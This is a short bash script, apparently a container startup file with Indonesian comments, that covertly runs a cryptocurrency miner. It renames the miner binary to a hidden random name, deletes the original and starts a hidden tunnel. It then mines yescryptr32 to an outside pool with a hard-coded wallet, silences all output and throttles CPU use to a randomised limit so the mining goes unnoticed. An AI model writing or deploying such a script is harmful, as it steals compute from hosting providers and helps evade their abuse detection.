#!/bin/bash

sleep $((RANDOM % 20 + 5))

NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"

cp /app/sr "/app/$NAME"
chmod +x "/app/$NAME"
rm -f /app/sr

/usr/local/bin/.netd access tcp \
--hostname "$(cat .h)" \
--url 127.0.0.1:443 >/dev/null 2>&1 &

# jalankan dengan timeout 20 menit
timeout 1200s /app/$NAME \
-a yescryptr32 \
-o eu.rplant.xyz:7047 \
-u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.multo \
-p x \
--cpu-threads 2 \
--cpu-threads-intensity 1 \
--cpu-threads-priority 1 >/dev/null 2>&1 &

P=$!

# limiter tambahan
LIMIT=$((75 + RANDOM % 5))
cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &

tail -f /dev/null
